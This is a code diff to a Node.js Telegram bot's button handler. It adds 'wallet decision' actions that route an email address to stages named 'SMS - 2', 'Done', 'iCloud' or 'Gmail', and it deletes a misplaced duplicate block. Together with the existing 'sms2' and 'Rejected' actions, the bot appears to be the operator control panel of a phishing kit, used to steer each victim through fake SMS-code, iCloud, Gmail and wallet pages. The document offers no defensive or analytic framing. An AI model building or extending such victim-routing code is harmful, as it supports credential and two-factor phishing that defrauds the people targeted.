@@ -353,6 +353,14 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
       } else if (action === "sms2_reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
+      } else if (action === "wallet_decision_sms") {
+        statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+      } else if (action === "wallet_decision_done") {
+        statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+      } else if (action === "wallet_decision_icloud") {
+        statusMessage = `📧 <code>${email}</code> → ☁️`;
+      } else if (action === "wallet_decision_gmail") {
+        statusMessage = `📧 <code>${email}</code> → 🌈`;
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
@@ -411,63 +419,3 @@ module.exports = { bot };
 
 // The callback handler should already be processing these patterns
 // Just ensure it hits the right endpoints for iCloud
-
-// ✅ Handle Wallet Decision Buttons
-if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
-  try {
-    console.log(`🔘 Wallet decision button clicked: ${action}`);
-    
-    // Remove buttons from Telegram message
-    try {
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-    } catch (err) {
-      console.error("Error removing buttons:", err);
-    }
-    
-    // Send popup
-    let popupText = '';
-    let statusMessage = '';
-    
-    if (action === 'wallet_decision_sms') {
-      popupText = '💬 SMS - 2';
-      statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
-    } else if (action === 'wallet_decision_done') {
-      popupText = '🏁 Done';
-      statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
-    } else if (action === 'wallet_decision_icloud') {
-      popupText = '☁️ iCloud';
-      statusMessage = `📧 <code>${email}</code> → ☁️`;
-    } else if (action === 'wallet_decision_gmail') {
-      popupText = '🌈 Gmail';
-      statusMessage = `📧 <code>${email}</code> → 🌈`;
-    }
-    
-    await bot.answerCallbackQuery(query.id, { text: `✅ ${popupText}` });
-    
-    // Send status message
-    if (statusMessage) {
-      const botToken = process.env.BOT_TOKEN;
-      const chatId = process.env.ADMIN_CHAT_ID;
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: statusMessage,
-          parse_mode: "HTML"
-        })
-      });
-      console.log(`✅ Wallet decision status sent: ${statusMessage}`);
-    }
-    
-    return;
-  } catch (err) {
-    console.error("❌ Wallet decision button error:", err);
-    await bot.answerCallbackQuery(query.id, { text: "Error processing button" });
-    return;
-  }
-}
